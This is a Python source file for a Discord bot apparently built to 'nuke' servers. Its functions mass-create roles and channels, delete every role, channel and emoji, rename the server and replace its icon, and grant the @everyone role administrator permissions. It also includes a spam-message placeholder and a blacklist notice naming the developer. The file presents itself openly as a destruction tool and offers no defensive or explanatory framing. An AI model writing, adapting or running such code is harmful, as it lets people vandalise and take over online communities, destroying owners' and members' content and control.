# coding: utf-8
import os
import json
import discord
import subprocess
import datetime
from os import system, name
from discord.ext.commands.core import cooldown
from discord import Permissions

from discord.ext import (
    commands,
    tasks
)


spam_message = """your spam message""" 


black_text = """
**Good time of day. When using one of the bot's commands, it turned out that you are on blacklist, because you are denied access to all the functions of rhis bot. You could have been added to the blacklist for the following reasons:**
```diff

- Suspicion of activities aimed ar reducing the efficiency of the bot.

- Suspicion of activities aimed ar harming the bot owner-project.

- Suspicion of activities directed against the partners of the project-owner of the bot.

- An open feud with the developer of the bot.
```
**If you think that none of the above has anything to do with you - contact the developer of the bot: `! ARMAGEDD0N#3261`**
"""

with open("json/config.json") as f:
    config = json.load(f)
token = config.get("token")
prefix = config.get("prefix")
loghook = config.get("loghook")
developer_list = config.get("developer_list")
channels_name = config.get("channels_name")
roles_name = config.get("roles_name")
server_name = config.get("server_name")
avatar_file = config.get("avatar_file")


intents = discord.Intents.default()
intents.members = True

client = commands.Bot(command_prefix=prefix, intents=intents)
client.remove_command('help')


# Spam roles
async def creating_roles(ctx):
    for i in range(100):
        try:
            await ctx.guild.create_role(name=roles_name)
        except:
            try:
                await ctx.guild.create_role(name=roles_name)
            except:
                pass

# Edit avatar and name server
async def r3name(ctx):
    with open(f'ARMAGEDDON/{avatar_file}', 'rb') as f:
        icon = f.read()
    await ctx.guild.edit(icon=icon)
    await ctx.guild.edit(name=server_name)

# Spam channels
async def creating_channels(ctx):
    for n in range(250):
        try:
            await ctx.guild.create_text_channel(channels_name)
        except:
            try:
                await ctx.guild.create_text_channel(channels_name)
            except:
                pass

# Delete all roles
async def deleting_roles(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            try:
                await role.delete()
            except:
                pass

# Delete all channels - text channels, voice channels, categories
async def deleting_channels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            try:
                await channel.delete()
            except:
                pass

# Delete all emoji
async def emoji_deleting(ctx):
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            try:
                await emoji.delete()
            except:
                pass

# Give administrator permissions everyone
async def everyone_admins(ctx):
    role = discord.utils.get(ctx.message.guild.roles, name="@everyone")
    perms = discord.Permissions(administrator=True)

    await role.edit(permissions=perms)


@client.command()
async def load(ctx, extension):

	if ctx.author.id in developer_list:
		client.load_extension(f"cogs {extension}")
		await ctx.send("Cogs loaded!")

	else:
		await ctx.send("You are not a bot developer.")


@client.command()
async def unload(ctx, extension):
	if ctx.author.id in []:
		client.unload_extension(f"cogs {extension}")
		await ctx.send("Cogs unloaded!")

	else:
		await ctx.send("You are not a bot developer.")


@client.command()
async def reload(ctx, extension):
	if ctx.author.id in developer_list:
		client.unload_extension(f"cogs {extension}")
		client.load_extension(f"cogs {extension}")
		await ctx.send("Cogs reloaded!")

	else:
		await ctx.send("You are not a bot developer.")


for filename in os.listdir("./cogs"):
	if filename.endswith(".py"):
		client.load_extension(f"cogs.{filename[:-3]}")


client.run(token)